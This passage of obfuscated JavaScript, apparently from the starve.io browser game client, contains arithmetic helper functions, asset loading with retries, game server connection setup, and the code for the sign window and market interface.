			const ⵠᐃⲆᐃⵠⵠΔ = (ΔΔⲆⲆΔΔΔ + 38990) % 65522;
			const ⵠⵠᐃⲆⵠⵠⲆᐃᐃ = ᐃⵠᐃⵠΔΔⵠ ^ 29521;
			const ᐃᐃᐃⵠⵠᐃᐃⵠΔ = ~(ⲆᐃΔᐃⲆ & 15547) & (ⲆᐃΔᐃⲆ | 15547);
			const ᐃⵠᐃᐃⲆᐃⲆⲆᐃ = ~(13636 & ᐃΔΔⲆΔⵠᐃ) & (ᐃΔΔⲆΔⵠᐃ | 13636);
			const ΔⲆΔⵠⲆⲆΔ = ⲆⵠⲆᐃᐃⲆⲆ(ⲆᐃΔⵠⲆᐃΔ, ⲆΔΔⵠΔΔᐃ, ⵠᐃⲆᐃⵠⵠΔ, ⵠⵠᐃⲆⵠⵠⲆᐃᐃ, ᐃᐃᐃⵠⵠᐃᐃⵠΔ);
			const ⵠⵠᐃΔⲆΔᐃⵠⵠ = ΔⵠⵠΔᐃΔᐃ(ᐃⵠᐃᐃⲆᐃⲆⲆᐃ, ⲆᐃΔⵠⲆᐃΔ, ⲆΔΔⵠΔΔᐃ, ⵠᐃⲆᐃⵠⵠΔ);
			const ᐃΔⲆⵠⵠΔⵠᐃⲆ = (ΔⲆΔⵠⲆⲆΔ | 52932) & ~(ΔⲆΔⵠⲆⲆΔ & 52932);
			return ᐃΔⲆⵠⵠΔⵠᐃⲆ
		}

		function ΔⵠⵠⵠΔⵠᐃⵠⲆ() {
			ΔΔⲆᐃ.ΔⵠⲆΔⲆΔΔ("https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fwww.starve.io%2F&display=popup&ref=plugin&src=like&kid_directed_site=0")
		}

		function ᐃΔⲆΔⵠΔⵠⲆⲆ(ⲆⵠΔⲆⲆᐃᐃ, ⲆⲆΔᐃΔⵠⵠ, ΔⲆΔⵠᐃⲆⵠ, ΔⲆΔⲆⵠᐃⲆ, ᐃΔⲆᐃⵠⲆᐃ, ⲆᐃⲆΔΔΔΔ) {
			const ⵠⲆΔⲆᐃᐃᐃ = (1 + 22695477 * (21327 + ⲆⵠΔⲆⲆᐃᐃ)) % 4294967296;
			const ⵠᐃΔΔⲆⵠᐃ = 17710 ^ ⲆⲆΔᐃΔⵠⵠ;
			const ⵠⵠⵠΔᐃⵠᐃᐃΔ = ~(ΔⲆΔⵠᐃⲆⵠ & 37664) & (ΔⲆΔⵠᐃⲆⵠ | 37664);
			const ⵠⲆΔⲆⲆⲆⲆⵠⲆ = ΔⲆΔⲆⵠᐃⲆ ^ 35523;
			const ⲆⲆⵠᐃⵠⲆⲆᐃΔ = ᐃΔⲆᐃⵠⲆᐃ ^ 51335;
			const ᐃΔⵠⵠΔᐃⲆΔⲆ = ~(24510 & ⲆᐃⲆΔΔΔΔ) & (ⲆᐃⲆΔΔΔΔ | 24510);
			const ᐃᐃᐃⵠⲆⲆⵠ = ᐃΔΔⵠΔᐃⵠ(ⵠⲆΔⲆᐃᐃᐃ, ⵠᐃΔΔⲆⵠᐃ);
			const ⵠΔᐃⲆⵠⵠⵠΔᐃ = ᐃᐃΔⵠⵠⵠᐃ(ⵠⵠⵠΔᐃⵠᐃᐃΔ, ⵠⲆΔⲆⲆⲆⲆⵠⲆ, ⲆⲆⵠᐃⵠⲆⲆᐃΔ, ᐃΔⵠⵠΔᐃⲆΔⲆ, ⵠⲆΔⲆᐃᐃᐃ, ⵠᐃΔΔⲆⵠᐃ);
			const ᐃΔΔΔⵠⵠⲆΔⵠ = (ᐃᐃᐃⵠⲆⲆⵠ | 63390) & ~(63390 & ᐃᐃᐃⵠⲆⲆⵠ);
			return ᐃΔΔΔⵠⵠⲆΔⵠ
		}

		function ᐃⵠΔⲆⲆΔⵠΔⵠ(ΔᐃΔΔⲆⵠⵠ, ᐃⲆⵠⵠΔΔᐃ, ΔⲆⲆΔⲆΔⲆ, ΔⵠⲆΔⲆᐃᐃ, ⲆᐃΔⲆⲆᐃᐃ, ᐃⵠⵠⲆΔⲆᐃ) {
			const ⲆⵠΔΔⲆΔᐃ = (46355 + ΔᐃΔΔⲆⵠⵠ) % 65320;
			const ΔᐃⵠᐃⵠΔⵠ = ~(ᐃⲆⵠⵠΔΔᐃ & 52876) & 52876 | ~(52876 & ᐃⲆⵠⵠΔΔᐃ) & ᐃⲆⵠⵠΔΔᐃ;
			const ΔⲆᐃⲆΔⲆΔⲆⵠ = ΔⲆⲆΔⲆΔⲆ ^ 6293;
			const ⵠΔⲆΔΔᐃΔΔᐃ = (1 + 22695477 * (62211 + ΔⵠⲆΔⲆᐃᐃ)) % 4294967296;
			const ⵠᐃᐃⵠᐃΔⵠᐃⵠ = (1013904223 + (ⲆᐃΔⲆⲆᐃᐃ + 10158) * 1664525) % 4294967296;
			const ΔⲆⲆᐃⵠΔⵠⲆᐃ = ~(ᐃⵠⵠⲆΔⲆᐃ & 28405) & (ᐃⵠⵠⲆΔⲆᐃ | 28405);
			const ⲆᐃⵠⵠΔⵠⵠ = ᐃᐃΔⵠⵠⵠᐃ(ⲆⵠΔΔⲆΔᐃ, ΔᐃⵠᐃⵠΔⵠ, ΔⲆᐃⲆΔⲆΔⲆⵠ, ⵠΔⲆΔΔᐃΔΔᐃ, ⵠᐃᐃⵠᐃΔⵠᐃⵠ, ΔⲆⲆᐃⵠΔⵠⲆᐃ);
			const ⵠΔⲆΔᐃⵠⵠ = ⵠⵠⵠΔⲆⲆⵠⲆⵠ(ⲆⵠΔΔⲆΔᐃ, ΔᐃⵠᐃⵠΔⵠ);
			const ᐃⲆⵠⲆⲆⵠΔⲆⲆ = (0 << ((ⲆᐃⵠⵠΔⵠⵠ ^ ⵠΔⲆΔᐃⵠⵠ) >> 24 & 255)) + (8 << ((ⲆᐃⵠⵠΔⵠⵠ ^ ⵠΔⲆΔᐃⵠⵠ) >> 8 & ΔⵠⲆᐃᐃΔᐃ)) + (24 << ((ⲆᐃⵠⵠΔⵠⵠ ^ ⵠΔⲆΔᐃⵠⵠ) >> 0 & 255)) + (16 << ((ⲆᐃⵠⵠΔⵠⵠ ^ ⵠΔⲆΔᐃⵠⵠ) >> 16 & 255));
			return ᐃⲆⵠⲆⲆⵠΔⲆⲆ
		}

		function ΔΔΔᐃᐃⲆⲆ(ΔⲆΔⲆⵠⵠᐃ, ᐃⵠⲆᐃⲆ, ⵠᐃⵠᐃΔ, ⵠⲆⵠᐃⵠⲆᐃ) {
			ᐃΔᐃᐃⵠⵠᐃ(ⲆᐃΔⵠⲆ, ΔⲆΔⲆⵠⵠᐃ, ᐃⵠⲆᐃⲆ, ⵠᐃⵠᐃΔ, ⵠⲆⵠᐃⵠⲆᐃ);
			const ᐃᐃⵠᐃⲆⵠⵠᐃᐃ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[ⵠⲆᐃⵠ], ΔᐃΔᐃ[1], ΔᐃΔᐃ[2], ΔᐃΔᐃ[3], ΔᐃΔᐃ[0], ΔᐃΔᐃ[1]);
			const ⲆⲆΔⲆᐃΔΔⲆᐃ = ᐃᐃΔᐃⲆᐃⲆ(ΔᐃΔᐃ[ⲆⲆΔᐃ], ΔᐃΔᐃ[ᐃⵠⲆΔᐃ], ΔᐃΔᐃ[ⵠΔⲆⵠ], ΔᐃΔᐃ[ΔⲆᐃᐃ], ΔᐃΔᐃ[2], ΔᐃΔᐃ[3]);
			const ⵠⲆⲆⲆⵠᐃᐃⵠΔ = 40902 ^ ᐃᐃⵠᐃⲆⵠⵠᐃᐃ;
			return ⵠⲆⲆⲆⵠᐃᐃⵠΔ
		}

		function ᐃᐃⲆΔᐃᐃⲆ(ᐃⲆⵠΔⵠΔⵠ, ᐃᐃⲆⲆᐃⲆΔ, ⵠᐃᐃᐃⵠΔᐃ) {
			const ⲆᐃΔΔᐃΔΔ = ~(ᐃⲆⵠΔⵠΔⵠ & 38098) & 38098 | ~(38098 & ᐃⲆⵠΔⵠΔⵠ) & ᐃⲆⵠΔⵠΔⵠ;
			const ⲆΔᐃᐃΔΔⲆ = 5457 ^ ᐃᐃⲆⲆᐃⲆΔ;
			const ⵠᐃᐃⲆΔᐃⵠ = (2531011 + 214013 * (ⵠᐃᐃᐃⵠΔᐃ + 61276)) % 4294967296;
			const ΔⲆᐃΔⵠΔᐃ = ⲆᐃᐃΔΔᐃⲆⵠⲆ(ⲆᐃΔΔᐃΔΔ, ⲆΔᐃᐃΔΔⲆ, ⵠᐃᐃⲆΔᐃⵠ);
			const ᐃⲆᐃⲆΔᐃΔΔᐃ = ⲆΔᐃⵠⲆⵠⵠ(ⲆᐃΔΔᐃΔΔ, ⲆΔᐃᐃΔΔⲆ, ⵠᐃᐃⲆΔᐃⵠ, ⲆᐃΔΔᐃΔΔ, ⲆΔᐃᐃΔΔⲆ, ⵠᐃᐃⲆΔᐃⵠ);
			const ⲆⵠΔⵠᐃⲆΔᐃⲆ = (ΔⲆᐃΔⵠΔᐃ | 39918) & ~(39918 & ΔⲆᐃΔⵠΔᐃ);
			return ⲆⵠΔⵠᐃⲆΔᐃⲆ
		}

		function ⲆⲆⲆⵠⵠᐃΔΔⵠ(Ⲇⵠ, Δ, ⲆᐃᐃΔΔᐃᐃⲆⵠ) {
			this.Ⲇⵠ = Ⲇⵠ;
			this.Δ = Δ;
			this.ᐃⲆΔΔᐃΔᐃ = {
				translate: {
					x: 0,
					y: 0
				},
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("loading").style,
				"ⵠⲆᐃ": function() {
					this.style.left = this.translate.x + ⵠ[39];
					this.style.top = Math.floor(this.translate.y) + ⵠ[39]
				}
			};
			this.ᐃⲆΔΔᐃΔᐃ.style.position = "absolute";
			this.ᐃⲆΔΔᐃΔᐃ.style.display = ⵠ[35];
			this.ᐃⲆΔΔᐃΔᐃ.ⵠⲆᐃ();
			this.ⲆΔⲆᐃⵠ = ⵠⲆⲆⵠᐃ;
			this.stop = function() {
				this.ⲆΔⲆᐃⵠ = false
			};
			this.ⵠᐃΔⲆⵠᐃᐃ = {
				total: ⵠⲆΔ
			};
			var ᐃᐃᐃ = this;
			var ⲆΔⲆΔᐃ = function() {};
			var ᐃΔΔᐃⵠ = 0;
			var ᐃⲆΔΔᐃ = 40;
			this.ⵠⲆⲆᐃΔ = function() {
				ᐃᐃᐃ.ⵠⲆᐃ();
				ᐃΔΔᐃⵠ++;
				if (ᐃΔΔᐃⵠ == ᐃⲆΔΔᐃ) {
					ᐃᐃᐃ.stop();
					ⲆΔⲆΔᐃ();
					return
				}
				ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[275]](ᐃᐃᐃ.ⵠⲆⲆᐃΔ, 0)
			};
			this.ⵠΔΔΔᐃ = function(ΔⲆⵠΔΔ) {
				ⲆΔⲆΔᐃ = ΔⲆⵠΔΔ;
				ᐃᐃᐃ.ⵠⲆⲆᐃΔ()
			};
			var ΔΔⵠⲆⲆΔΔΔⵠ = (new Date).getTime();

			function ⵠᐃΔⲆΔᐃᐃ(name) {
				if (-1 !== name.indexOf("normal-mode") || name.indexOf("player0") !== -1) return ΔⵠⲆΔ;
				if (name.indexOf("day-bag") !== -1 || -ΔⲆᐃᐃ !== name.indexOf("night-bag") || -ΔΔᐃⵠ !== name.indexOf("day-book") || -1 !== name.indexOf("night-book") || name.indexOf("day-player") !== -ⵠⲆΔ || -1 !== name.indexOf("night-player") || name.indexOf("day-accessory") !== -1 || -ΔΔΔ !== name.indexOf("night-accessory") || name.indexOf("day-crate") !== -1 || -ⲆⵠⲆⲆ !== name.indexOf("night-crate") || name.indexOf("day-skin") !== -1 || -ⵠΔΔ !== name.indexOf("night-skin") || name.indexOf("day-river") !== -1 || -ΔⲆⵠ !== name.indexOf("night-river") || name.indexOf("day-river") !== -1 || name.indexOf("night-river") !== -ΔΔΔ || name.indexOf("day-rock") !== -ⵠᐃⵠΔ || name.indexOf("night-rock") !== -1 || name.indexOf("day-flower") !== -ⲆⵠⲆⲆ || name.indexOf("night-flower") !== -ⵠⲆΔ || name.indexOf("day-leaf") !== -1 || name.indexOf("night-leaf") !== -1 || name.indexOf("day-herb") !== -ΔΔᐃⵠ || name.indexOf("night-herb") !== -ⵠΔΔ || -1 !== name.indexOf("day-shell") || name.indexOf("night-shell") !== -ΔᐃᐃⲆ || -1 !== name.indexOf("day-hand-skin") || -1 !== name.indexOf("night-hand-skin") || -1 !== name.indexOf("bignight") || -1 !== name.indexOf("bigday") || -1 !== name.indexOf("bigzday") || name.indexOf("bigznight") !== -1 || name.indexOf("tutorial-box") !== -1 || name.indexOf("tuto-") !== -1 || -1 !== name.indexOf("-leaderboard-") || name.indexOf("-lead-") !== -1 || name.indexOf("day-lava-") !== -ᐃⲆᐃ || name.indexOf("night-lava-") !== -ΔΔΔ || name.indexOf("-click.png") !== -1 || name.indexOf("-in.png") !== -ⲆⵠⲆⲆ || name.indexOf("-fog") !== -1 || -ⲆⵠⲆⲆ !== name.indexOf("-lava") || -1 !== name.indexOf("pebblecompo") || name.indexOf("avatar-player") !== -1) return 0;
				return ΔⵠΔⵠ
			}
			var ⵠⵠⲆⵠⲆΔΔ = Object.keys(ⲆΔ).length;
			var ΔⲆⲆΔⵠⲆⵠⲆΔ = ⵠⵠⲆⵠⲆΔΔ;
			console.log(ⲆΔΔΔⲆ, undefined);
			for (var ᐃⵠ in ⲆΔ) {
				if (ⵠᐃΔⲆΔᐃᐃ(ⲆΔ[ᐃⵠ]) === 0) ⵠⵠⲆⵠⲆΔΔ--
			}
			console.log(ⲆᐃΔⲆᐃ, undefined);
			var ᐃΔΔᐃᐃᐃᐃⵠᐃ = function() {
				if (0 !== this.ΔᐃᐃΔⲆⲆΔ) return this.ΔᐃᐃΔⲆⲆΔ;
				this.ΔᐃᐃΔⲆⲆΔ = ᐃⵠⲆⲆⲆ;
				this.src = this.ⲆⲆᐃⲆⲆ;
				return 0
			};
			var ΔᐃⲆΔΔᐃΔ = function(ⲆⲆᐃⲆ) {
				this.ΔᐃᐃΔⲆⲆΔ = ΔΔᐃⵠ
			};
			var ⲆⵠᐃⲆᐃΔΔ = ΔΔⵠ;
			var ᐃᐃᐃᐃᐃⲆⵠΔᐃ = function() {
				console.log(ᐃⲆᐃⲆⲆ);
				if (ΔᐃᐃⲆ === ⲆⵠᐃⲆᐃΔΔ) return;
				ⲆⵠᐃⲆᐃΔΔ = 1;
				console.log(undefined);
				ⵠⲆⲆⲆᐃᐃⲆ !== ΔⵠᐃᐃⲆᐃΔ && ΔⵠᐃᐃⲆᐃΔ();
				ⵠⲆⲆⲆᐃᐃⲆ();
				var Δᐃⵠᐃⵠⵠᐃ = ΔΔⲆᐃ.ⲆⲆᐃᐃⵠΔⲆ("server");
				if (null !== Δᐃⵠᐃⵠⵠᐃ) {
					ΔⵠⲆᐃ.ⲆⵠⵠⲆⵠᐃΔ = ⵠⲆΔ;
					ΔⵠⲆᐃ.ΔΔⲆΔⲆ = [{
						nu: 0,
						m: 100,
						i: "server" + Δᐃⵠᐃⵠⵠᐃ + ".starve.io",
						p: 443,
						a: Δᐃⵠᐃⵠⵠᐃ,
						ssl: ⵠᐃⵠΔ
					}]
				}
				ΔⵠⲆᐃ.ᐃᐃᐃⵠⵠᐃⵠᐃⵠ();
				setTimeout(ⲆᐃᐃΔΔᐃᐃⲆⵠ, 100)
			};
			var ⲆΔᐃⵠⵠΔᐃ = function() {
				let ΔᐃΔᐃⲆⵠΔ = function() {
					ΔⵠⲆᐃ.ⵠⵠᐃⲆⲆⵠⵠ(ᐃᐃᐃᐃᐃⲆⵠΔᐃ)
				};
				if (!document.fonts || !document.fonts.check) setTimeout(ΔᐃΔᐃⲆⵠΔ, 1e3);
				else if (document.fonts.check("1em Baloo Paaji")) setTimeout(ΔᐃΔᐃⲆⵠΔ, 100);
				else setTimeout(ⲆΔᐃⵠⵠΔᐃ, ΔΔᐃⵠᐃ)
			};
			var ⵠⲆᐃⵠΔⵠⵠ = function() {
				this.ⲆΔⵠᐃΔΔⵠ++;
				console.warn(`Image (${this.src}) failed to load, attempt ${this.ⲆΔⵠᐃΔΔⵠ}`, this);
				if (3 < this.ⲆΔⵠᐃΔΔⵠ) {
					console.warn("Failed to load image too many times")
				}
				var ΔΔΔⵠⲆΔΔⵠᐃ = this.ⲆΔⵠᐃΔΔⵠ;
				var ⲆⲆᐃⲆⲆ = this.src;
				var ΔΔⲆΔⵠⲆⲆⲆΔ = 0 === ⵠᐃΔⲆΔᐃᐃ(ⲆⲆᐃⲆⲆ) ? 1e4 : 2e3;
				setTimeout((function() {
					for (var ⵠᐃ in ᐃΔⵠΔᐃΔⵠ) {
						if (ⲆⲆᐃⲆⲆ.indexOf(ᐃΔⵠΔᐃΔⵠ[ⵠᐃ]) !== -ⵠΔΔ) {
							ⲆΔ[ⵠᐃ] = new Image;
							ⲆΔ[ⵠᐃ].onload = ΔᐃⲆΔΔᐃΔ;
							ⲆΔ[ⵠᐃ].onerror = ⵠⲆᐃⵠΔⵠⵠ;
							ⲆΔ[ⵠᐃ].ⲆΔⵠᐃΔΔⵠ = ΔΔΔⵠⲆΔΔⵠᐃ;
							ⲆΔ[ⵠᐃ].src = ⲆⲆᐃⲆⲆ;
							break
						}
					}
				}), ΔΔⲆΔⵠⲆⲆⲆΔ)
			};

			function ⲆᐃⲆΔΔΔⲆ(ⵠⲆᐃⲆΔΔᐃΔⲆ) {
				for (var ⵠᐃ in ⲆΔ) {
					var Δⵠⵠᐃᐃ = ⲆΔ[ⵠᐃ];
					if (typeof Δⵠⵠᐃᐃ !== ⵠ[360]) continue;
					if (ⵠᐃΔⲆΔᐃᐃ(Δⵠⵠᐃᐃ) !== ⵠⲆᐃⲆΔΔᐃΔⲆ) continue;
					ⲆΔ[ⵠᐃ] = new Image;
					ⲆΔ[ⵠᐃ].ΔᐃᐃΔⲆⲆΔ = 0;
					ⲆΔ[ⵠᐃ].ⲆΔⵠᐃΔΔⵠ = 0;
					ⲆΔ[ⵠᐃ].onload = ΔᐃⲆΔΔᐃΔ;
					ⲆΔ[ⵠᐃ].onerror = ⵠⲆᐃⵠΔⵠⵠ;
					ⲆΔ[ⵠᐃ].ΔⲆᐃΔΔᐃΔ = ᐃΔΔᐃᐃᐃᐃⵠᐃ;
					ⲆΔ[ⵠᐃ].ⲆⲆᐃⲆⲆ = Δⵠⵠᐃᐃ
				}
			}
			ⲆᐃⲆΔΔΔⲆ(ⵠⲆΔ);
			ⲆᐃⲆΔΔΔⲆ(0);
			ᐃᐃΔΔᐃ(1, "l", ΔⲆᐃᐃᐃⲆⲆ, ⵠ[481]);
			ⲆΔᐃⵠⵠΔᐃ();
			ΔᐃⵠⲆⲆΔⵠ();
			this.ⵠⲆᐃ = function() {
				this.ᐃⲆΔΔᐃΔᐃ.translate.x = (ΔΔΔᐃ - 500) / 2;
				this.ᐃⲆΔΔᐃΔᐃ.translate.y = (ⵠⲆᐃⲆ - 150) / 2;
				var ΔᐃⵠΔ = 2500 / (ᐃⲆΔΔᐃ - ᐃΔΔᐃⵠ + ΔⲆⵠ) - 48;
				this.ᐃⲆΔΔᐃΔᐃ.translate.y -= ΔᐃⵠΔ;
				this.ᐃⲆΔΔᐃΔᐃ.ⵠⲆᐃ()
			};
			this.ᐃⲆΔΔᐃΔᐃ.ⵠⲆᐃ();
			this.ΔᐃΔⵠ = function() {
				try {
					ΔᐃΔⲆⲆᐃΔ()
				} catch (ⵠΔⵠⵠ) {}
				this.ⵠⲆᐃ()
			}
		}

		function ΔΔⲆⲆⲆΔᐃⵠⵠ(Δⵠⵠⵠᐃⵠⵠ, ᐃΔᐃΔΔ, ⵠⲆⵠⲆⲆⲆΔ, ⲆⵠⲆⲆⵠΔⵠ, ⲆΔⵠⲆⲆⵠΔ, ⵠⲆⲆᐃΔⲆΔ) {
			const ΔᐃⵠⲆᐃⵠᐃ = (33122 | Δⵠⵠⵠᐃⵠⵠ) & ~(33122 & Δⵠⵠⵠᐃⵠⵠ);
			const ⲆⵠΔⲆⲆⵠⵠᐃⵠ = (16 << (ᐃΔᐃΔΔ >> 16 & 255)) + (24 << (ᐃΔᐃΔΔ >> 0 & 255)) + (8 << (ᐃΔᐃΔΔ >> 24 & 255)) + (0 << (ᐃΔᐃΔΔ >> 8 & 255));
			const ΔⲆⲆⲆᐃᐃⵠᐃᐃ = ⵠⲆⵠⲆⲆⲆΔ ^ 53573;
			const ⲆⲆᐃⲆⵠⵠⲆⲆⲆ = (24 << (ⲆⵠⲆⲆⵠΔⵠ >> 16 & 255)) + (8 << (ⲆⵠⲆⲆⵠΔⵠ >> 24 & 255)) + (16 << (ⲆⵠⲆⲆⵠΔⵠ >> 0 & 255)) + (0 << (ⲆⵠⲆⲆⵠΔⵠ >> ⵠⵠᐃΔⲆ & 255));
			const ΔΔⲆᐃΔⲆᐃⲆⲆ = (8 << (ⲆΔⵠⲆⲆⵠΔ >> 16 & 255)) + (16 << (ⲆΔⵠⲆⲆⵠΔ >> 0 & 255)) + (24 << (ⲆΔⵠⲆⲆⵠΔ >> 24 & 255)) + (ⵠΔⲆⵠ << (ⲆΔⵠⲆⲆⵠΔ >> ᐃⵠᐃᐃⵠ & 255));
			const ⵠⲆⲆΔⵠⲆⵠⵠⲆ = ~(10561 & ⵠⲆⲆᐃΔⲆΔ) & (ⵠⲆⲆᐃΔⲆΔ | 10561);
			const ΔⲆΔⵠΔⵠⲆⲆⲆ = ᐃᐃᐃⵠⵠΔⲆΔⲆ(ΔᐃⵠⲆᐃⵠᐃ, ⲆⵠΔⲆⲆⵠⵠᐃⵠ, ΔⲆⲆⲆᐃᐃⵠᐃᐃ, ⲆⲆᐃⲆⵠⵠⲆⲆⲆ, ΔΔⲆᐃΔⲆᐃⲆⲆ);
			const ⲆⵠⵠⵠΔⵠΔᐃⵠ = ᐃⲆᐃⵠⲆⵠᐃ(ⵠⲆⲆΔⵠⲆⵠⵠⲆ, ΔᐃⵠⲆᐃⵠᐃ);
			const ⵠΔΔΔΔΔⵠⵠⵠ = (((ΔⲆΔⵠΔⵠⲆⲆⲆ ^ ⲆⵠⵠⵠΔⵠΔᐃⵠ) + 10389) * 1103515245 + 12345) % 2147483648;
			return ⵠΔΔΔΔΔⵠⵠⵠ
		}

		function ΔᐃⵠⲆᐃⲆᐃ(ⲆⵠⲆⲆⵠ, ΔΔᐃᐃⲆᐃᐃ) {
			const ΔᐃᐃᐃⵠⲆᐃ = (24 << (ⲆⵠⲆⲆⵠ >> 8 & 255)) + (0 << (ⲆⵠⲆⲆⵠ >> 0 & 255)) + (8 << (ⲆⵠⲆⲆⵠ >> 16 & ΔⵠᐃⵠΔ)) + (16 << (ⲆⵠⲆⲆⵠ >> 24 & 255));
			const ΔᐃⲆⵠⵠΔΔ = ~(46210 & ΔΔᐃᐃⲆᐃᐃ) & (46210 | ΔΔᐃᐃⲆᐃᐃ);
			const ⲆⲆΔⲆⲆⲆⲆ = ΔΔΔⲆΔΔΔ(ΔᐃᐃᐃⵠⲆᐃ, ΔᐃⲆⵠⵠΔΔ);
			const ⵠᐃⵠᐃᐃᐃᐃⲆⲆ = ⵠΔⲆᐃⲆⲆⵠΔᐃ(ΔᐃᐃᐃⵠⲆᐃ, ΔᐃⲆⵠⵠΔΔ);
			const ⲆΔⵠΔΔⲆᐃΔᐃ = ~(36778 & ⲆⲆΔⲆⲆⲆⲆ) & ⲆⲆΔⲆⲆⲆⲆ | ~(ⲆⲆΔⲆⲆⲆⲆ & 36778) & 36778;
			return ⲆΔⵠΔΔⲆᐃΔᐃ
		}

		function ᐃⵠⵠⲆⲆⵠⲆⵠⲆ(Ⲇⵠ, Δ) {
			var ᐃᐃᐃ = this;
			this.Ⲇⵠ = Ⲇⵠ;
			this.Δ = Δ; - ⵠΔⲆ < ᐃⲆᐃΔᐃⵠᐃ.navigator.userAgent.indexOf("Edge") ? (this.ᐃⵠⲆᐃᐃΔⵠ = "default", this.ᐃΔΔΔⵠⲆΔ = "pointer") : (this.ᐃⵠⲆᐃᐃΔⵠ = "url('img/cursor0.png'), default", this.ᐃΔΔΔⵠⲆΔ = "url('img/cursor1.png'), pointer");
			this.ᐃᐃΔⵠⵠⵠⲆ = ⵠΔⵠΔ;
			this.ΔΔᐃΔⲆΔⵠ = ᐃᐃⲆΔ;
			this.ⵠᐃΔᐃⵠⵠⵠ = 1;
			this.ᐃΔΔΔⵠᐃⲆ = ⵠΔⵠΔ;
			this.ⲆⵠⲆᐃᐃᐃⵠⲆⲆ = {
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]](ⵠ[471]).style,
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 125) + ⵠ[39];
					this.style.top = "110px"
				}
			};
			this.ⲆⲆⵠⲆ = {
				"ⲆΔΔⲆⵠᐃⲆ": Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠᐃⵠⵠΔᐃᐃ]),
				"ΔᐃᐃⲆᐃᐃᐃ": Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ᐃⲆΔⵠⲆⲆᐃ])
			};
			this.sign = {
				open: ΔᐃⵠᐃⲆ,
				"ᐃᐃⲆⲆⵠⵠᐃᐃⵠ": 0,
				"ⵠΔΔⵠΔⵠⲆ": document[ΔᐃⲆⵠⲆⵠΔ[68]]("sign_object"),
				"ᐃΔⲆⵠΔⵠᐃ": 0,
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("sign_window"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("sign_window").style,
				button: Δⵠⵠ(60, 60, "", ⵠⲆ[Ⲇ.ⵠΔⲆᐃⵠᐃᐃ]),
				"ΔΔᐃΔⵠΔⲆ": function() {
					var Δⵠ = Math.floor(Math.floor((3 + ᐃᐃΔ.ⵠΔΔⲆ.ⵠⵠᐃΔᐃ.length) / ⲆᐃᐃΔ) * (10 + ⵠⲆ[Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ][0].width) + 35);
					this.button.info.translate.x = Δⵠ;
					this.button.info.translate.y = 22
				},
				"ⵠⲆᐃ": function() {
					this.style.left = Math.floor(Δᐃⵠᐃ - 150) + ⵠ[39];
					this.style.top = Math.floor(ᐃΔⵠᐃ - 115) + ⵠ[39]
				},
				"ⵠΔΔΔᐃ": function() {
					ΔⵠⵠⲆ.sign.style.display = ⵠ[465];
					ΔⵠⵠⲆ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] = false
				},
				select: function() {
					ΔⵠⵠⲆ.sign[ΔᐃⲆⵠⲆⵠΔ[72]] = !ΔⵠⵠⲆ.sign[ΔᐃⲆⵠⲆⵠΔ[72]];
					if (ΔⵠⵠⲆ.sign[ΔᐃⲆⵠⲆⵠΔ[72]]) ΔⵠⵠⲆ.sign.style.display = ⵠ[35];
					else ΔⵠⵠⲆ.sign.style.display = ⵠ[465]
				},
				ok: function() {
					ΔⵠⲆᐃ.ᐃᐃⲆⵠΔΔⲆΔᐃ(ᐃᐃΔ.sign.ⲆⲆΔᐃⵠ, ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ);
					ΔⵠⵠⲆ.sign.select()
				},
				up: function() {
					ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ = ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ === 0 ? ᐃⲆⵠᐃᐃ.ⲆΔΔⵠⵠⵠⲆ - 1 : ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ - Ⲇᐃⵠ;
					ΔⵠⵠⲆ.sign.ⵠΔΔⵠΔⵠⲆ.src = "./img/sign" + ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ + ".png"
				},
				down: function() {
					ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ = (ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ + 1) % ᐃⲆⵠᐃᐃ.ⲆΔΔⵠⵠⵠⲆ;
					ΔⵠⵠⲆ.sign.ⵠΔΔⵠΔⵠⲆ.src = "./img/sign" + ΔⵠⵠⲆ.sign.ᐃΔⲆⵠΔⵠᐃ + ".png"
				}
			};
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("quit_sign")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.sign.select, ᐃⵠⵠⲆᐃ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("ok_sign")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.sign.ok, ⵠΔⲆⲆⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("sign_up")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.sign.up, ᐃⵠΔⵠⲆ);
			document[ΔᐃⲆⵠⲆⵠΔ[68]]("sign_down")[ΔᐃⲆⵠⲆⵠΔ[277]](ⵠ[215], this.sign.down, ⲆΔⲆᐃΔ);
			this.ⲆⵠⵠⲆᐃ = {
				open: ⵠᐃⵠᐃᐃ,
				id: document[ΔᐃⲆⵠⲆⵠΔ[68]]("shop_market"),
				style: document[ΔᐃⲆⵠⲆⵠΔ[68]]("shop_market").style,
				items: [{
					id: ΔΔⵠⵠ,
					name: "wood",
					"ⵠΔⵠⵠΔ": 1,
					b: ΔⵠⲆΔ,
					a: 3,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ⵠⵠⲆⲆⲆⵠⲆ
				}, {
					id: 1,
					name: "stone",
					"ⵠΔⵠⵠΔ": 1,
					b: 1,
					a: ΔⲆⲆⲆ,
					"ᐃⵠⲆⲆⵠ": Ⲇ.ΔΔᐃⲆΔΔᐃ
				}, {
					id: ᐃⲆⵠᐃ,
